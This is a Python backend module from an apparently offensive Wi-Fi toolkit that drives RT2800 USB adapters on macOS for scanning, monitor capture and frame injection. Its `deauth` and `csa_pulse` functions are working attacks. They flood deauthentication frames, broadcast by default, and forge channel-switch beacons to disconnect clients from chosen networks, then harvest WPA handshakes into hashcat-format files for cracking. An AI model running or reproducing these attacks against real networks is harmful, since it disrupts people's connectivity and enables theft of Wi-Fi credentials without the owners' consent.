"""macOS userspace backend for Ralink/MediaTek RT2800 USB Wi-Fi adapters.

The built-in macOS radio is handled by ``wifi_macos`` (CoreWLAN scan +
``tcpdump`` monitor RX, no injection).  This backend drives the bundled
``rt2800d`` userspace driver, which claims the USB adapter through IOKit and
supports monitor capture and frame injection without a kext.

Imported lazily only on darwin.  It must not import tkinter or CoreWLAN and it
must keep ``rt2800d`` stdout reserved for machine data (JSON/pcap); the driver
writes diagnostics to stderr.
"""

import json
import os
import re
import subprocess
import threading
import time
from pathlib import Path

from src import elwand_paths

IFACE_PREFIX = "rt2800usb"
IFACE_NAME = "rt2800usb0"

_CHIP_NAMES = {
    (0x148F, 0x3572): "RT5592",
    (0x148F, 0x3573): "RT5592",
    (0x148F, 0x5370): "RT5370",
    (0x148F, 0x5372): "RT5372",
    (0x148F, 0x5572): "RT5572",
    (0x0B05, 0x17E8): "RT5592",
}

_lock = threading.RLock()
_capture_proc = None
_capture_active = False
_op_state = None
_pending = 0
_last_scan = []
_last_scan_at = 0.0
_usb_ids = None

# Adapter discovery runs `ioreg` (a subprocess that can take a while) and must
# never block the GUI thread, so it is refreshed in a daemon thread and callers
# only read this snapshot. The runtime-dir copy (binary/firmware) is done in the
# same background worker.
_ADAPTER_TTL = 30.0
_adapter_lock = threading.Lock()
_adapter_snapshot = {
    "at": 0.0,
    "devices": [],
    "usb_ids": {(0x148F, 0x3572)},
    "ready": False,
    "loading": False,
}


# ---------------------------------------------------------------------------
# discovery / paths


def _wm():
    from src.tools.scanner import wifi_monitor
    return wifi_monitor


def _macos():
    from src.tools.scanner import wifi_macos
    return wifi_macos


def _driver_bin():
    try:
        p = Path(elwand_paths.rt2800_bin())
    except Exception:
        return None
    return p if p.is_file() else None


def _firmware():
    try:
        p = Path(elwand_paths.rt2800_firmware_dir())
    except Exception:
        return None
    return p if (p / "rt2870.bin").is_file() else None


def driver_ready():
    return _driver_bin() is not None and _firmware() is not None


def _env():
    env = os.environ.copy()
    fw = _firmware()
    if fw is not None:
        env["RTW89_FW_DIR"] = str(fw)
    return env


def _op_begin(name, wait=False, timeout=20.0):
    """Claim the single USB adapter for scan/attack. Capture uses _claim_capture."""
    global _op_state, _pending
    if wait:
        with _lock:
            _pending += 1
    try:
        end = time.time() + timeout if wait else 0.0
        while True:
            with _lock:
                if _op_state is None and (wait or _pending == 0):
                    _op_state = name
                    return True
            if not wait or time.time() >= end:
                return False
            time.sleep(0.1)
    finally:
        if wait:
            with _lock:
                _pending -= 1


def _op_end(name):
    global _op_state
    with _lock:
        if _op_state == name:
            _op_state = None


def _claim_capture(stop_event):
    global _op_state
    while not stop_event.is_set():
        with _lock:
            if _op_state in ("attack", "csa"):
                return False
            if _op_state is None and _pending == 0:
                _op_state = "capture"
                return True
        time.sleep(0.2)
    return False


def operation_active():
    with _lock:
        return _op_state is not None or _pending > 0


def _load_usb_ids():
    global _usb_ids
    if _usb_ids is not None:
        return _usb_ids
    ids = {(0x148F, 0x3572)}
    try:
        path = elwand_paths.rt2800_dir() / "usb_ids.json"
        with open(path, "r", encoding="utf-8") as f:
            ids = {(int(v), int(p)) for v, p in json.load(f)}
    except Exception:
        try:
            from importlib.resources import files
            raw = files("src").joinpath("data/rt2800/usb_ids.json").read_text("utf-8")
            ids = {(int(v), int(p)) for v, p in json.loads(raw)}
        except Exception:
            pass
    _usb_ids = ids
    return ids


def _ioreg_scan():
    """Run ioreg once and return the parsed USB device list (blocking)."""
    devices = []
    try:
        r = subprocess.run(
            ["ioreg", "-p", "IOUSB", "-l", "-w", "0"],
            capture_output=True, text=True, timeout=5,
        )
        text = r.stdout or ""
    except (OSError, subprocess.TimeoutExpired):
        text = ""
    seen = set()
    for block in text.split("+-o ")[1:]:
        m_vid = re.search(r'"idVendor"\s*=\s*(\d+)', block)
        m_pid = re.search(r'"idProduct"\s*=\s*(\d+)', block)
        if not m_vid or not m_pid:
            continue
        vid, pid = int(m_vid.group(1)), int(m_pid.group(1))
        if (vid, pid) in seen:
            continue
        seen.add((vid, pid))
        m_name = re.search(r'"USB Product Name"\s*=\s*"([^"]*)"', block)
        m_mfg = re.search(r'"USB Vendor Name"\s*=\s*"([^"]*)"', block)
        devices.append({
            "vid": vid,
            "pid": pid,
            "product": m_name.group(1) if m_name else "",
            "manufacturer": m_mfg.group(1) if m_mfg else "",
        })
    return devices


def _refresh_adapters_once():
    """Refresh the adapter snapshot synchronously (off-thread callers only)."""
    try:
        # Sync the bundled binary/firmware without blocking a GUI caller.
        elwand_paths.rt2800_dir()
    except Exception:
        pass
    devices = _ioreg_scan()
    ids = _load_usb_ids()
    ready = driver_ready()
    with _adapter_lock:
        _adapter_snapshot["devices"] = devices
        _adapter_snapshot["usb_ids"] = ids
        _adapter_snapshot["ready"] = ready
        _adapter_snapshot["at"] = time.time()


def _refresh_adapters_async():
    """Start a daemon refresh of the adapter snapshot (non-blocking)."""
    with _adapter_lock:
        if _adapter_snapshot["loading"]:
            return
        _adapter_snapshot["loading"] = True

    def _work():
        try:
            _refresh_adapters_once()
        finally:
            with _adapter_lock:
                _adapter_snapshot["loading"] = False

    threading.Thread(target=_work, daemon=True).start()


def _adapter_data():
    """(devices, usb_ids, ready) from the snapshot, refreshing if stale."""
    with _adapter_lock:
        stale = (time.time() - _adapter_snapshot["at"]) >= _ADAPTER_TTL
        loading = _adapter_snapshot["loading"]
        devices = list(_adapter_snapshot["devices"])
        ids = set(_adapter_snapshot["usb_ids"])
        ready = _adapter_snapshot["ready"]
    if stale and not loading:
        _refresh_adapters_async()
    return devices, ids, ready


def adapters(wait=False):
    """Detected RT2800 USB adapters (whether or not the helper is usable).

    Discovery happens in a background thread, so this never blocks the GUI
    thread. ``wait=True`` forces a synchronous refresh and must only be used
    from off-GUI callers (e.g. the init dialog's checker thread)."""
    if wait:
        _refresh_adapters_once()
    devices, known, ready = _adapter_data()
    out = []
    idx = 0
    for dev in devices:
        if (dev["vid"], dev["pid"]) not in known:
            continue
        name = f"{IFACE_PREFIX}{idx}" if idx else IFACE_NAME
        idx += 1
        out.append({
            "name": name,
            "vid": f"0x{dev['vid']:04x}",
            "pid": f"0x{dev['pid']:04x}",
            "chip": _CHIP_NAMES.get((dev["vid"], dev["pid"]), "RT2800"),
            "product": dev.get("product", ""),
            "manufacturer": dev.get("manufacturer", ""),
            "usable": ready,
        })
    return out


def available():
    return any(a["usable"] for a in adapters())


def interfaces():
    return [IFACE_NAME] if available() else []


def is_iface(iface):
    return bool(iface) and str(iface).startswith(IFACE_PREFIX)


def capture_supported():
    return available()


def injection_supported():
    return available()


def _emit_error(msg):
    try:
        _wm()._emit_error(msg)
    except Exception:
        pass


def _emit_info(msg):
    try:
        _wm()._emit_info(msg)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# driver process helpers


def _busy_text(text):
    low = (text or "").lower()
    return ("0xe00002c5" in low or "device open failed" in low
            or "no supported adapter" in low)


def _run_once(args, timeout=60.0):
    bin_path = _driver_bin()
    if bin_path is None:
        return False, "", "rt2800d not found"
    try:
        r = subprocess.run(
            [str(bin_path)] + [str(a) for a in args],
            env=_env(), capture_output=True, text=True, timeout=timeout,
        )
        return r.returncode == 0, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return False, "", "rt2800d timed out"
    except OSError as e:
        return False, "", str(e)


def _run(args, timeout=60.0, retries=2):
    last = (False, "", "")
    for attempt in range(retries + 1):
        last = _run_once(args, timeout)
        if last[0] or not _busy_text(last[2] or last[1]):
            return last
        if attempt < retries:
            time.sleep(0.7)
    return last


def _terminate(proc):
    try:
        proc.terminate()
    except Exception:
        pass
    try:
        proc.wait(timeout=2)
        return
    except Exception:
        pass
    try:
        proc.kill()
    except Exception:
        pass
    try:
        proc.wait(timeout=1)
    except Exception:
        pass


_last_err_emit = 0.0


def _drain_stderr(proc, collect=None):
    global _last_err_emit
    try:
        for raw in iter(proc.stderr.readline, b""):
            line = raw.decode("utf-8", "replace").strip()
            low = line.lower()
            if collect is not None:
                collect.append(line)
            if "bad frame size" in low or "wrong frame size" in low:
                continue
            if "0xe00002c5" in low:
                now = time.time()
                if now - _last_err_emit > 3.0:
                    _emit_error("rt2800: adapter busy (exclusive access). "
                                "Close other monitor/scan/attack processes or "
                                "unplug/replug the adapter.")
                    _last_err_emit = now
            elif any(w in low for w in ("error", "failed", "invalid", "timed out")):
                now = time.time()
                if now - _last_err_emit > 3.0:
                    _emit_error(f"rt2800: {line}")
                    _last_err_emit = now
    except Exception:
        pass


def wait_idle(iface=None, timeout=20.0):
    end = time.time() + timeout
    while time.time() < end:
        with _lock:
            if (_op_state is None and _pending == 0
                    and _capture_proc is None and not _capture_active):
                return True
        time.sleep(0.1)
    return False


def cleanup():
    global _op_state, _pending
    with _lock:
        proc = _capture_proc
        _op_state = None
        _pending = 0
    if proc is not None:
        _terminate(proc)


# ---------------------------------------------------------------------------
# scan


def _norm_scan(entries, iface):
    wm = _wm()
    nets = []
    now = time.time()
    for n in entries or []:
        bssid = str(n.get("bssid") or "").upper()
        if not bssid:
            continue
        dbm = n.get("signal_dbm")
        try:
            dbm = int(dbm)
        except (TypeError, ValueError):
            dbm = None
        chan = n.get("chan") or 0
        try:
            chan = int(chan)
        except (TypeError, ValueError):
            chan = 0
        freq = n.get("freq") or ""
        if freq and not str(freq).endswith("MHz"):
            freq = f"{freq} MHz"
        if not freq and chan:
            freq = wm.channel_to_freq(chan)
        nets.append({
            "ssid": n.get("ssid") or "(hidden)",
            "bssid": bssid,
            "signal": wm.dbm_to_pct(dbm),
            "signal_dbm": dbm,
            "security": n.get("security") or "OPEN",
            "pmf": n.get("pmf") or "no",
            "chan": chan,
            "freq": freq,
            "device": iface or IFACE_NAME,
            "devices": [iface or IFACE_NAME],
            "stale": False,
            "last_seen": now,
        })
    return nets


def scan(iface=None):
    global _last_scan, _last_scan_at
    if not _op_begin("scan", wait=False):
        with _lock:
            return list(_last_scan)
    try:
        ok, out, err = _run(["scan", "--json"], timeout=75)
        if not ok:
            _emit_error(f"rt2800 scan failed: {(err or out or '').strip()[:200]}")
            return list(_last_scan)
        try:
            data = json.loads(out)
        except Exception:
            _emit_error("rt2800 scan returned invalid JSON")
            return list(_last_scan)
        nets = _norm_scan(data, iface)
        with _lock:
            _last_scan = nets
            _last_scan_at = time.time()
        return nets
    finally:
        _op_end("scan")


# ---------------------------------------------------------------------------
# capture


def _capture_for(iface, channel, seconds, stop_event=None):
    wm = _wm()
    bin_path = _driver_bin()
    if bin_path is None:
        return
    args = [str(bin_path), "monitor", str(int(channel)), str(max(1, int(seconds))), "--pcap"]
    try:
        proc = subprocess.Popen(
            args, env=_env(), stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
    except OSError as e:
        _emit_error(f"rt2800 capture: {e}")
        return
    threading.Thread(target=_drain_stderr, args=(proc,), daemon=True).start()
    try:
        _macos()._pump(proc, iface, stop_event or threading.Event(),
                       time.time() + max(1.0, float(seconds)),
                       wm._locked_channel)
    finally:
        _terminate(proc)


def capture_loop(iface, stop_event):
    if not _claim_capture(stop_event):
        return
    try:
        _capture_loop_impl(iface, stop_event)
    finally:
        _op_end("capture")


def _capture_loop_impl(iface, stop_event):
    global _capture_proc, _capture_active
    bin_path = _driver_bin()
    if bin_path is None:
        _emit_error("rt2800d not found; cannot start monitor mode")
        return
    _emit_info(f"rt2800: monitor on {iface}")
    while not stop_event.is_set():
        wm = _wm()
        locked = wm._locked_channel
        args = [str(bin_path), "monitor", str(int(locked or 1)), "0", "--pcap"]
        if not locked:
            args.append("--hop")
        started = time.time()
        try:
            proc = subprocess.Popen(
                args, env=_env(), stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
        except OSError as e:
            _emit_error(f"rt2800 capture: {e}")
            time.sleep(1.0)
            continue
        with _lock:
            _capture_proc = proc
            _capture_active = True
        threading.Thread(target=_drain_stderr, args=(proc,), daemon=True).start()
        try:
            _macos()._pump(proc, iface, stop_event, time.time() + 86400.0, locked)
        except Exception as e:
            _emit_error(f"rt2800 capture loop: {e}")
        finally:
            _terminate(proc)
            with _lock:
                _capture_proc = None
                _capture_active = False
        if stop_event.is_set():
            break
        if time.time() - started < 1.5:
            time.sleep(1.0)
        else:
            time.sleep(0.15)


# ---------------------------------------------------------------------------
# injection


def _channel_for(bssid):
    try:
        for n in _wm().get_networks():
            if (n.get("bssid") or "").upper() == str(bssid).upper():
                return int(n.get("chan") or 0)
    except Exception:
        pass
    return 0


def deauth(bssid, client=None, iface=None, count=64, reason=7,
           interval=0.005, rate=2, channel=None, capture_seconds=8):
    wm = _wm()
    if not available():
        return False, "RT2800 USB adapter/driver not available."
    bssid = wm._mac(bssid)
    if not bssid:
        return False, "No target network selected."
    chan = int(channel or _channel_for(bssid) or 0)
    if not chan:
        return False, f"Unknown channel for {bssid}; cannot deauth."
    dst = wm._mac(client) or "FF:FF:FF:FF:FF:FF"
    bin_path = _driver_bin()
    if bin_path is None:
        return False, "rt2800d not found."
    targets = [(bssid, chan)]
    client_mac = wm._mac(client)
    target_seen = False
    if client_mac:
        try:
            nets = wm.get_networks()
            selected = next(
                (n for n in nets if (n.get("bssid") or "").upper() == bssid),
                None)
            ssid = (selected or {}).get("ssid")
            if ssid and ssid != "(hidden)":
                for n in nets:
                    nb = wm._mac(n.get("bssid"))
                    nc = int(n.get("chan") or 0)
                    if nb and nb != bssid and nc and n.get("ssid") == ssid:
                        targets.append((nb, nc))
        except Exception:
            pass
        try:
            for p in wm.get_probes():
                if p.get("mac") != client_mac:
                    continue
                target_seen = True
                for other in p.get("bssids") or []:
                    other = wm._mac(other)
                    if not other or other == bssid:
                        continue
                    och = _channel_for(other)
                    if och:
                        targets.append((other, och))
                break
        except Exception:
            pass
    seen = set()
    targets = [t for t in targets if not (t in seen or seen.add(t))]

    if not _op_begin("attack", wait=True, timeout=20.0):
        return False, "The RT2800 adapter is busy (monitor/scan still running)."
    try:
        per_cap = max(4, int(capture_seconds) // max(1, len(targets)))
        hs_before = wm.get_stats().get("handshakes", 0)
        sent_targets = 0
        last_rc = 0
        last_errs = []
        for tb, tch in targets:
            try:
                wm._known_bssids.add(tb)
            except Exception:
                pass
            args = [str(bin_path), "deauth", str(tch), tb, dst,
                    str(int(count)), str(int(reason)), "--pcap",
                    "--capture-seconds", str(int(per_cap))]
            if client_mac:
                args.append("--dtim-sync")
            rc = None
            errs = []
            for attempt in range(3):
                errs = []
                try:
                    proc = subprocess.Popen(
                        args, env=_env(), stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                except OSError as e:
                    last_errs = [str(e)]
                    break
                threading.Thread(target=_drain_stderr,
                                 args=(proc, errs), daemon=True).start()
                try:
                    _macos()._pump(
                        proc, iface or IFACE_NAME, threading.Event(),
                        time.time() + 20.0 + float(per_cap),
                        wm._locked_channel,
                    )
                finally:
                    _terminate(proc)
                rc = proc.returncode
                if rc is None:
                    try:
                        rc = proc.wait(timeout=2)
                    except Exception:
                        rc = -1
                if rc == 0:
                    sent_targets += 1
                    break
                if not _busy_text("\n".join(errs)) or attempt == 2:
                    break
                time.sleep(0.7)
            if rc not in (0, None):
                last_rc = rc
                last_errs = errs
        if sent_targets == 0:
            detail = last_errs[-1] if last_errs else ""
            return False, (f"Deauth failed (rt2800d exit {last_rc})"
                           + (f": {detail}" if detail else "."))
        hs_after = wm.get_stats().get("handshakes", 0)
        delta = max(0, hs_after - hs_before)
        target = "all clients (broadcast)" if dst == "FF:FF:FF:FF:FF:FF" else dst
        tlist = ", ".join(f"{b}@ch{c}" for b, c in targets)
        msg = (f"Sent {count} beacon-synced deauth frames per BSSID to "
               f"{target} on {tlist} via {iface or IFACE_NAME}.")
        if sent_targets < len(targets):
            msg += f" ({sent_targets}/{len(targets)} BSSIDs succeeded.)"
        if client_mac and not target_seen:
            msg += (" Target not seen recently; keep the device awake/connected "
                    "and verify its current MAC.")
        if delta:
            msg += f" Handshake(s) captured: {delta}."
        return True, msg
    finally:
        _op_end("attack")


def csa_pulse(iface, bssid=None, client=None, ssid="", channel=0,
              targets=None, on_log=None, stop_event=None, **opts):
    """CSA pulse compatible with ``csa_attack.csa_pulse`` for the USB adapter."""
    from src.tools.scanner import csa_attack
    wm = _wm()
    opt = dict(csa_attack.DEFAULTS)
    opt.update({k: v for k, v in opts.items() if v is not None})
    log = on_log or (lambda *a, **k: None)
    done = stop_event or csa_attack._Never()

    if targets:
        tg = [(wm._mac(b), int(c)) for (b, c) in targets]
    elif bssid:
        tg = [(wm._mac(bssid), int(channel or 0))]
    else:
        tg = []
    tg = [(b, c) for (b, c) in tg if b]

    summary = {"ok": False, "reason": "", "beacons": 0, "actions": 0,
               "cycles": 0, "eapol": 0, "handshakes": 0, "target_seen": False,
               "hc22000": "", "targets": [b for b, _ in tg]}

    if not available():
        summary["reason"] = "RT2800 USB adapter/driver not available."
        return summary
    if not tg:
        summary["reason"] = "No target BSSID."
        return summary
    if any(c == 0 for _, c in tg):
        summary["reason"] = "Unknown channel for a target BSSID."
        return summary

    tinfo = [(b, c, csa_attack._dead_chan(c, int(opt["target_chan"])))
             for b, c in tg]
    paths = [csa_attack._handshake_path(ssid, b) for b, _, _ in tinfo]
    base_handshakes = wm.get_stats().get("handshakes", 0)
    for b, _, _ in tinfo:
        try:
            wm._known_bssids.add(b)
        except Exception:
            pass

    if not _op_begin("csa", wait=True, timeout=20.0):
        summary["reason"] = "The RT2800 adapter is busy (monitor/scan still running)."
        return summary

    t0 = time.time()
    log("[*] CSA pulse on %s -> %s (targets: %s)"
        % (iface, ssid or "?",
           ", ".join("%s@ch%d" % (b, c) for b, c, _ in tinfo)))
    try:
        while True:
            if done.is_set():
                break
            if opt["duration"] and (time.time() - t0) >= float(opt["duration"]):
                break

            for b, ap_ch, dead_ch in tinfo:
                if done.is_set():
                    break
                count = max(8, min(64, int(float(opt["attack_window"]) * 8)))
                log("[*] attack window: CSA %s ch%d -> ch%d (%d beacons)"
                    % (b, ap_ch, dead_ch, count))
                ok, out, err = _run(
                    ["csa", str(ap_ch), b, str(dead_ch),
                     client or "ff:ff:ff:ff:ff:ff", str(count),
                     str(int(opt["count"]))],
                    timeout=max(30.0, 15.0 + count / 4.0),
                )
                if not ok:
                    detail = (err or out or "").strip().splitlines()
                    log("[!] CSA error: %s" % (detail[-1] if detail else "unknown"),
                        "error")
                    continue
                summary["beacons"] += count

                obs = max(1, int(float(opt["observe_window"])))
                hs_before = wm.get_stats().get("handshakes", 0)
                _capture_for(iface, ap_ch, obs, done)
                hs_after = wm.get_stats().get("handshakes", 0)
                summary["eapol"] += max(0, hs_after - hs_before)
                summary["handshakes"] = hs_after - base_handshakes
                summary["cycles"] += 1
                log("[*] observe window: %d EAPOL / %d handshake(s)"
                    % (max(0, hs_after - hs_before), summary["handshakes"]))
                if summary["handshakes"]:
                    summary["hc22000"] = next(
                        (p for p in paths if p and os.path.exists(p)),
                        paths[0] if paths else "")
            if opt["duration"] and (time.time() - t0) >= float(opt["duration"]):
                break
    except Exception as e:
        summary["reason"] = str(e)
        log(f"[!] attack error: {e}", "error")
    finally:
        try:
            wm.flush_handshakes()
        except Exception:
            pass
        _op_end("csa")

    summary["ok"] = True
    summary["reason"] = summary["reason"] or "done"
    return summary


def status():
    """Small dict used by the init dialog / diagnostics."""
    return {
        "adapters": adapters(),
        "driver": str(_driver_bin() or ""),
        "firmware": str(_firmware() or ""),
        "ready": driver_ready(),
    }
